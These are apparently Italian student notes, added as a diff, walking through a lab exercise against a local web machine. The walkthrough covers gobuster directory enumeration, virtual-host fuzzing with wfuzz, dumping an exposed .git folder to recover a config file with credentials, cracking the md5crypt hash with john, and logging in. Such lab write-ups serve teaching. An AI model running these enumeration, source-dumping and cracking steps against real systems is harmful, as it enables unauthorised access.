@@ -1,0 +1,319 @@
+webenum
+
+cerco http://localhost sul browser, e mi trovo un sito web davanti
+
+1) Faccio la scansione di probabili sottodirectory usando gobuster
+
+   └─$ gobuster dir -u http://localhost -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
+	
+   e vedo che mi risponde:
+	
+   Error: the server returns a status code that matches the provided options for non existing urls. http://localhost/2478b423-771b-4868-b9b0-4b16b5906ec2 => 200 (Length: 23607). To continue please exclude the status code or the length
+
+   gobuster mi dà un errore, praticamente lui prova a cercare le varie sottodirectory utilizzando quelle con il nome più comune, e le prende dalla wordlist che abbiamo incluso nel comando, il problema è che il sito, ad ogni indirizzo
+   che non conosce, ci fa un redirect nella pagina principale, quindi qualunque sia la sottodirectory che cerchiamo, ci restituisce il codice 200 OK, e quindi non posso sapere se una sottodirectory esiste o meno.
+
+2) Devo quindi modificare la scansione di gobuster, andando a mettere un flag aggiuntivo al comando
+
+   Sappiamo che di default mi restituisce sempre la pagina home, e quindi con la stessa lunghezza, quindi devo dirgli, che se mi restituisce lo stesso body, allora quella pagina per cui ho appena fatto la richiesta, non esiste e si
+   tratta di un redirect
+   
+   Quindi vedo nell'help di gobuster vedo che ho il flag exclude-length, e la length me la prendo dall'errore di prima, cioè "Length: 23607"
+
+   quindi
+   └─$ gobuster dir -u http://localhost -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt --exclude-length 23607
+
+e come risultato mi restituisce:
+   ===============================================================
+   Gobuster v3.6
+   by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+   ===============================================================
+   [+] Url:                     http://localhost
+   [+] Method:                  GET
+   [+] Threads:                 10
+   [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
+   [+] Negative Status codes:   404
+   [+] Exclude Length:          23607
+   [+] User Agent:              gobuster/3.6
+   [+] Timeout:                 10s
+   ===============================================================
+   Starting gobuster in directory enumeration mode
+   ===============================================================
+   /images               (Status: 301) [Size: 169] [--> http://localhost/images/]
+   /css                  (Status: 301) [Size: 169] [--> http://localhost/css/]
+   /js                   (Status: 301) [Size: 169] [--> http://localhost/js/]
+   Progress: 141708 / 141709 (100.00%)
+   ===============================================================
+   Finished
+   ===============================================================
+
+   gobuster ha quindi trovato 3 sottodirectory: images, css e js
+   l'unica che ci può interessare potrebbe essere la cartella js, quindi il codice sorgente della pagina con ctrl+u, e vedo se usa js
+
+   Vedo che lo usa, ma il file di js che usa non è presente nella cartella /js, quindi significa che c'è qualcos'altro che usa questa cartella
+
+3) Possiamo provare a fare la scansione con altre worldists, magari più grandi per trovare qualcosa in più
+   Quindi il senso è: parto da qualcosa più facile, se trovo qualcosa interessante allora mi ci fermo, oppure continuo con uno scan più grande
+
+   quindi
+
+   └─$ gobuster dir -u http://localhost -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --exclude-length 23607
+
+   E come risultato ho:
+
+   ===============================================================
+   Gobuster v3.6
+   by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+   ===============================================================
+   [+] Url:                     http://localhost
+   [+] Method:                  GET 
+   [+] Threads:                 10
+   [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+   [+] Negative Status codes:   404
+   [+] Exclude Length:          23607
+   [+] User Agent:              gobuster/3.6
+   [+] Timeout:                 10s
+   ===============================================================
+   Starting gobuster in directory enumeration mode
+   ===============================================================
+   /images               (Status: 301) [Size: 169] [--> http://localhost/images/]
+   /css                  (Status: 301) [Size: 169] [--> http://localhost/css/]
+   /js                   (Status: 301) [Size: 169] [--> http://localhost/js/]
+   /fonts                (Status: 301) [Size: 169] [--> http://localhost/fonts/]
+   Progress: 220560 / 220561 (100.00%)
+   ===============================================================
+   Finished
+   ===============================================================
+
+   Non trovo niente di interessante, solo la cartella /fonts, e quindi penso che è un pò strano
+
+   Infatti vedendo la wordlist che abbiamo usato, vedo che non include le estensioni dei file, nelle parole che sta testanto, allora devo includerle: (più gliene dò e più il diz è grande)  (cioè lui testa per esempio ciao e non 
+   ciao.txt, quindi non troverà mai il file ciao.txt se non specifichiamo l'estensione .txt) 
+
+   └─$ gobuster dir -u http://localhost -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --exclude-length 23607 -x html,php,txt
+
+   ed ho come risposta:
+
+   ===============================================================
+   Gobuster v3.6
+   by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+   ===============================================================
+   [+] Url:                     http://localhost
+   [+] Method:                  GET
+   [+] Threads:                 10
+   [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+   [+] Negative Status codes:   404
+   [+] Exclude Length:          23607
+   [+] User Agent:              gobuster/3.6
+   [+] Extensions:              html,php,txt
+   [+] Timeout:                 10s
+   ===============================================================
+   Starting gobuster in directory enumeration mode
+   ===============================================================
+   /images               (Status: 301) [Size: 169] [--> http://localhost/images/]
+   /css                  (Status: 301) [Size: 169] [--> http://localhost/css/]
+   /js                   (Status: 301) [Size: 169] [--> http://localhost/js/]
+   /readme.txt           (Status: 200) [Size: 1644]
+   /fonts                (Status: 301) [Size: 169] [--> http://localhost/fonts/]
+   /cloud.html           (Status: 200) [Size: 35176]
+   Progress: 882240 / 882244 (100.00%)
+   ===============================================================
+   Finished
+   ===============================================================
+
+   Quindi vedo che ho due file in più, vedo prima readme.txt, ma non ha niente di particolare 
+   ed ho anche cloud.html, quindi lo inserisco dopo il nome del sito sull'URL -> http://localhost/cloud.html
+
+
+4) Ho quindi una pagina web nuova, e vedo dal codice sorgente (ctrl+u) che usa le cartelle js e images, che avevamo trovato con la scansione di prima
+   in fondo alla pagina sorgente vedo che c'è uno script che si chiama customscript e che può contenere per esempio chiamate ad altri url etc
+   ma cliccandoci, non ho niente, quindi torno alla codice sorgente della pagina principale (http://localhost/cloud.html) e vedo che alla linea 60 ho un tag <a href> di HTML che chiama un'altra pagina:
+   
+   <a class="btn btn-primary btn-lg" href="http://cloud.vdsi/cloud.html#">Start Now</a>
+
+   Fa riferimento a cloud.vdsi ed io sto sul localhost (Per andare avanti con la macchina bisogna modificare delle regole nella pagina di configurazione del DNS, ma normalmente non si fa, è solo perchè ora sul localhost gireranno più
+   pagine web, sennò mi darebbe un errore del tipo "Server not found"
+
+   Quindi per modificare le regole di risoluzione del DNS vado su terminale e scrivo: sudo vim /etc/hosts/
+
+   mi si apre questo file e lo modifico così
+
+   127.0.0.1	localhost cloud.vdsi <-- aggiungo cloud.vdsi per fare l'esercitazione
+   127.0.1.1	kali
+   ::1		localhost ip6-localhost ip6-loopback
+   ff02::1		ip6-allnodes
+   ff02::2		ip6-allrouters
+
+   quindi effettivamnte vedo che mi ritorna alla stessa pagina se clicco su http://cloud.vdsi/cloud.html (che avevamo trovato alla riga 60 nel codice sorgente della pagina http://localhost/cloud.html)
+
+   QUINDI
+   Capisco che allo stesso IP corrispondono più pagine web, quindi posso fare l'enumerazione dei virtual hosts, cioè il server può hostare più webapp, ed ognuna si differenzia dal valore dell'header anche se l'IP è lo stesso, quindi 
+   a seconda del peso dell'header, mi risponde una webapp specifica
+   (eg web.uniroma2.it, ing.uniroma2.it etc.. quindi in base all'host davanti, mi manda su una pagina rispetto ad un'altra (per tor vergata in realtà non è così ma è per dare idea))
+
+   QUINDI so che è cloud.vdsi, ma in realtà potrebbe starci un altro sottodominio, tipo web.cloud.vdsi etc
+
+   quindi faccio l'enumerazione dei virtual host, allora faccio una caterva di richieste http ed ogni volta ci cambio un parametro (dell'host) ed utilizzo WFUZZ
+
+5) wfuzz
+
+   vedo wfuzz --help
+
+   Prima però vedo come è fatta la richiesta HTTP con burp, quindi attivo l'intercept e sul browser imposto che foxyproxy mi deve riindirizzare il traffico verso burp, quindi refresho la pagina ed ottengo: 
+
+   GET /cloud.html HTTP/1.1
+   Host: cloud.vdsi
+   User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+   Accept-Language: en-US,en;q=0.5
+   Accept-Encoding: gzip, deflate, br
+   Connection: close
+   Upgrade-Insecure-Requests: 1
+   If-Modified-Since: Wed, 01 May 2024 21:53:10 GMT
+   If-None-Match: "6632b9c6-8968"
+
+   
+   vedo che nell'help di wfuzz che ho il flag -H e metto FUZZ nel campo che voglio far ruotare
+
+   Quindi uso il comando:
+   └─$ wfuzz -H "Host: FUZZ.cloud.vdsi" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt http://localhost
+
+   dove "Host: ", lo vedo dalla response del server presa da burp
+
+   e vedo dal risultato di wfuzz che ho tutti valori uguali, quindi come prima devo escludere e flitrare, come con gobuster
+   quindi dall'helper uso il flag --hh <dim pagina di prima> (cioè 23607)
+
+   Quindi il comando diventa:
+   └─$ wfuzz -H "Host: FUZZ.cloud.vdsi" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt http://localhost --hh 23607
+   
+   e come response ho:
+
+   ********************************************************
+   * Wfuzz 3.1.0 - The Web Fuzzer                         *
+   ********************************************************
+
+   Target: http://localhost/
+   Total requests: 4989
+
+   =====================================================================
+   ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
+   =====================================================================
+
+   000000024:   302        0 L      0 W        0 Ch        "admin"                                                                                                                                                                    
+
+   Total time: 5.338912
+   Processed Requests: 4989
+   Filtered Requests: 4988
+   Requests/sec.: 934.4599
+
+   
+   Quindi scopro che esiste un URL così: admin.cloud.vdsi, lo aggiungo quindi a /etc/hosts/ come prima, perchè sennò mi darebbe errore la macchina (si fa solo per l'esercizio)
+   quindi cerco admin.cloud.vdsi e mi redirecta su -> http://admin.cloud.vdsi/login.php
+   
+   E mi dà una pagina con un login, quindi rifaccio con gobuster per vedere se ho sottodirectory/file:
+   └─$ gobuster dir -u http://admin.cloud.vdsi -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --exclude-length 0 -x php
+   
+   (ho usato exclude length per lo stesso motivo di prima)
+   (come risultato vedo che ho: config.php e vedo che è se vado su /config.php è vuoto, ma perchè è eseguito nel backend e quindi non mi stampa nulla come dovrebbe fare)
+
+   Vedo che ci metto tanto e cambio wordlist:
+   └─$ gobuster dir -u http://admin.cloud.vdsi -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --exclude-length 0 -x php
+
+   e mi ritorna:
+
+   ===============================================================
+   Gobuster v3.6
+   by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+   ===============================================================
+   [+] Url:                     http://admin.cloud.vdsi
+   [+] Method:                  GET
+   [+] Threads:                 10
+   [+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+   [+] Negative Status codes:   404
+   [+] Exclude Length:          0
+   [+] User Agent:              gobuster/3.6
+   [+] Extensions:              php
+   [+] Timeout:                 10s
+   ===============================================================
+   Starting gobuster in directory enumeration mode
+   ===============================================================
+   /.git                 (Status: 301) [Size: 169] [--> http://admin.cloud.vdsi/.git/]
+   /.git/HEAD            (Status: 200) [Size: 21]
+   /.git/config          (Status: 200) [Size: 139]
+   /.git/index           (Status: 200) [Size: 1543]
+   /.git/logs/           (Status: 403) [Size: 153]
+   /.gitignore           (Status: 200) [Size: 1256]
+   /css                  (Status: 301) [Size: 169] [--> http://admin.cloud.vdsi/css/]
+   /fonts                (Status: 301) [Size: 169] [--> http://admin.cloud.vdsi/fonts/]
+   /js                   (Status: 301) [Size: 169] [--> http://admin.cloud.vdsi/js/]
+   /login.php            (Status: 200) [Size: 1577]
+   Progress: 9454 / 9454 (100.00%)
+   ===============================================================
+   Finished
+   ===============================================================
+
+   Vedo che ho la cartella .git, che contiene i vari commit, le modifiche, i file etc perchè si salva tutto, quindi se la scaricassi potrei accedere al codice sorgente facilmente
+   posso farlo cercando su internet un tool per fare il dump della cartella git, e trovo -> https://github.com/arthaud/git-dumper
+   
+   Lo scarico come scritto sul readme della tool, usando il comando -> pip install git-dumper
+   Una volta scaricato per trovarlo faccio: find . -name git-dumper e vedo che git-dumper sta su -> ./.local/bin/git-dumper
+
+  quindi per usarlo faccio:
+  └─$ ./.local/bin/git-dumper http://admin.cloud.vdsi/.git ~/Desktop/webapp
+  (Sintassi: git-dumper <url> <cartella dove scarico tutta la cartella .git>
+  
+  Lo faccio partire, e dopo che ha finito, vado sulla cartella webapp nel desktop, e vedo che ho tutto il contenuto della cartella .git
+  vedo che ho config.php, che potrebbe contenere username e password per il login che abbiamo sul browser, lo apro e vedo:
+
+   <?php
+
+   /* Define username and password */
+   $Username = 'Steve';
+   $Password = '$1$ILHyDaIr$FShns4A6ASYLoyGaeCdgs1';
+
+6) john
+	
+   Devo quindi decrittografare la password e vederla in chiaro
+   quindi faccio un file hash.txt con solo l'hash -> $1$ILHyDaIr$FShns4A6ASYLoyGaeCdgs1
+   
+   quindi uso john
+   └─$ john --wordlist=/usr/share/rockyou.txt hash.txt <- dentro hash ci metto l'hash
+
+   ci da come response:
+   Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
+   Use the "--format=md5crypt-long" option to force loading these as that type instead
+   Using default input encoding: UTF-8
+   Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
+   Will run 8 OpenMP threads
+   Press 'q' or Ctrl-C to abort, almost any other key for status
+   panda.ninja      (?)     
+   1g 0:00:00:15 DONE (2024-05-04 15:33) 0.06657g/s 316250p/s 316250c/s 316250C/s panda4jeni..pancho47
+   Use the "--show" option to display all of the cracked passwords reliably
+   Session completed. 
+   
+   Quindi vedo che la password che ha trovato è: panda.ninja
+
+   Quindi vado nel login e metto username=Steve e password=panda.ninja
+ 
+   e vedo che sono entrato nel login :))
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
